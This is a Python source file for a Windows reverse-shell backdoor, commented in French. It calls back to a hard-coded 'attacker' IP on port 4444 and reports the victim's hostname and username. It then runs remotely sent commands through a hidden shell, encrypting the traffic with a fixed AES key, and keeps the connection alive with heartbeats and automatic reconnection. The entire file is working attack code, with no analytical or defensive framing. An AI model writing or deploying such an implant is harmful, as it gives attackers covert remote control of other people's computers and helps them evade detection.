import os
import sys
import base64
import socket
import subprocess
import time
import threading
import json
import ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# --- Configuration ---
AES_KEY = b'CeciEstUneCle16o'  # 16, 24 ou 32 octets
AES_IV = b'VoiciUnIVDe16Oct' # 16 octets
HOST = '172.21.160.1'  # IP de l'attaquant
PORT = 4444            # Port de l'attaquant

def aes_encrypt(data):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        return base64.b64encode(ct_bytes).decode('utf-8')
    except Exception:
        return None

def aes_decrypt(encoded_data):
    try:
        ct = base64.b64decode(encoded_data)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception:
        return None

def run_cmd(command):
    try:
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            return os.getcwd() + '>'
        else:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            result = subprocess.Popen(
                command, 
                shell=True, 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                startupinfo=startupinfo
            )
            output, error = result.communicate()
            return output + error
    except Exception as e:
        return f"Error: {e}\n"

def handle_connection(s):
    try:
        # Envoi des infos initiales
        init_info = {
            "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
            "username": os.environ.get('USERNAME', 'Unknown'),
            "cwd": os.getcwd()
        }
        s.send(aes_encrypt(json.dumps(init_info)).encode('utf-8'))

        while True:
            # Timeout pour gérer le heartbeat
            s.settimeout(60.0) 
            
            try:
                encrypted_cmd = s.recv(4096).decode('utf-8')
                if not encrypted_cmd:
                    break
            except socket.timeout:
                # Heartbeat : envoi d'un PING pour garder la connexion ouverte
                try:
                    s.send(aes_encrypt("PING").encode('utf-8'))
                except:
                    break
                continue

            command = aes_decrypt(encrypted_cmd)
            if command is None:
                continue
            
            if command.lower() == 'exit':
                s.close()
                sys.exit(0)
            
            if command == "PING":
                continue
            
            output = run_cmd(command)
            encrypted_output = aes_encrypt(output)
            
            if encrypted_output:
                s.send(encrypted_output.encode('utf-8'))

    except Exception:
        pass
    finally:
        try:
            s.close()
        except:
            pass

def main_loop():
    retry_count = 0
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Activation du TCP Keep-Alive
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            s.connect((HOST, PORT))
            
            retry_count = 0
            handle_connection(s)
            
        except Exception:
            retry_count += 1
            # Backoff exponentiel : attend de plus en plus longtemps entre les essais
            wait_time = min((retry_count * 2), 60)
            time.sleep(wait_time)

if __name__ == "__main__":
    main_thread = threading.Thread(target=main_loop, daemon=True)
    main_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)